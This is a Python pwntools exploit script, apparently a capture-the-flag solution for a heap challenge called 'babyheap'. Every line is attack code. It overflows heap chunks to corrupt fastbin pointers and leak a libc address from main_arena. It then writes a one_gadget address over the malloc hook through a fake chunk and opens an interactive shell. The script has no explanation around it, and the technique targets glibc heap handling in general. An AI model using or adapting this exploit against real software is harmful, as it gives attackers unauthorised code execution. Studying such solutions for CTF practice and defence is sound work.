from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./babyheap')

def allocate(size):
	io.recvuntil('Command: ')
	io.sendline('1')
	io.recvuntil('Size: ')
	io.sendline(str(size))

def fill(idx,content):
	io.recvuntil('Command: ')
	io.sendline('2')
	io.recvuntil('Index: ')
	io.sendline(str(idx))
	io.recvuntil('Size: ')
	io.sendline(str(len(content)))
	io.recvuntil('Content: ')
	io.sendline(content)
	
def free(idx):
	io.recvuntil('Command: ')
	io.sendline('3')
	io.recvuntil('Index: ')
	io.sendline(str(idx))
	
def dump(idx):
	io.recvuntil('Command: ')
	io.sendline('4')
	io.recvuntil('Index: ')
	io.sendline(str(idx))
	
allocate(0x10)	#0
allocate(0x10)	#1
allocate(0x10)	#2
allocate(0x80)	#3
free(2)
free(1)
payload = 'a'*0x10+p64(0)+p64(0x21)+p8(0x60)
fill(0,payload)
allocate(0x10)	#1
payload = 'a'*0x10+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0x21)
fill(1,payload)
allocate(0x10)	#2
payload = 'a'*0x10+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0x91)
fill(1,payload)
allocate(0x80)	#4
free(3)
dump(2)
io.recvuntil('Content: \n')
main_arena = u64(io.recv(6).ljust(8,'\x00'))-88
log.success('main arena: '+hex(main_arena))
libc_base = main_arena - 0x3c4b20
log.success('libc base: '+hex(libc_base))
one_gadget = libc_base + 0x4526a # 0x4526a 0xf02a4 0xf1147 0x45216
allocate(0x60)	#3
free(3)
fake_chunk_addr = main_arena - 0x33
payload = p64(fake_chunk_addr)
fill(2,payload)
allocate(0x60)	#3
allocate(0x60)	#5
payload = 'a'*0x13+p64(one_gadget)
fill(5,payload)
allocate(0x10)
io.interactive()
